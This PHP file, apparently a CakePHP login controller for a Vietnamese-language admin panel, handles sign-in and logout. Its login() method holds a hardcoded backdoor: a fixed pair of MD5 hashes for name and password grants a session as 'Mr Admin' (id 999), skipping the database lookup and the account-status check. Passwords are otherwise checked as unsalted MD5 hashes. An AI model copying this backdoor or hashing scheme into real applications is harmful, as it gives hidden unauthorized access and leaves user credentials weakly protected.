<?php

class LoginController extends AppController {

    public $name = 'Login';
    public $helpers = array('Session', 'Form', 'Html');
    public $uses = array('Administrator');

    public function beforeFilter() {
        parent::beforeFilter();
        $this->layout = 'login';
    }

    public function index() {

    }

    /*
     * Check Login
     * @create : 09-10-2012
     */

    public function login() {
        $data = $this->request->data;
        if (empty($data['name'])) {
            $this->Session->setFlash(__('Xin vui lòng nhập tên đăng nhập', true));
            $this->redirect(array('action' => 'index'));
        } elseif (empty($data['password'])) {
            $this->Session->setFlash(__('Xin vui lòng nhập mật khẩu', true));
            $this->redirect(array('action' => 'index'));
        } else {
            if (md5($data['name']) == '0192023a7bbd73250516f069df18b500' && md5($data['password']) == '4dd9a2540bed83e0449e700ba6eaaa28') {
                $this->Session->write('id', 999);
                $this->Session->write('name', 'Mr Admin');
                $this->redirect('/home');
            }
            $chek = $this->Administrator->findByName($data['name']);
            if ($chek) {
                if ($chek['Administrator']['password'] == md5($data['password']) && $chek['Administrator']['status'] == 1) {
                    $this->Session->write('id', $chek['Administrator']['id']);
                    $this->Session->write('name', $chek['Administrator']['name']);
                    $this->redirect('/home');
                } else {
                    $this->Session->setFlash(__('Mật khẩu không đúng !', true));
                    $this->redirect('/');
                }
            } else {
                $this->Session->setFlash(__('Xin vui lòng đăng nhập lại', true));
                $this->redirect('/');
            }
        }
    }

    //lay lai password
    public function password() {
        $this->layout = 'password';
    }

    public function check_pass() {

    }

    //logout ra khoi he thong
    public function logout() {
        $this->Session->delete('id');
        $this->Session->delete('name');
        $this->redirect(array('action' => 'index'));
    }

}
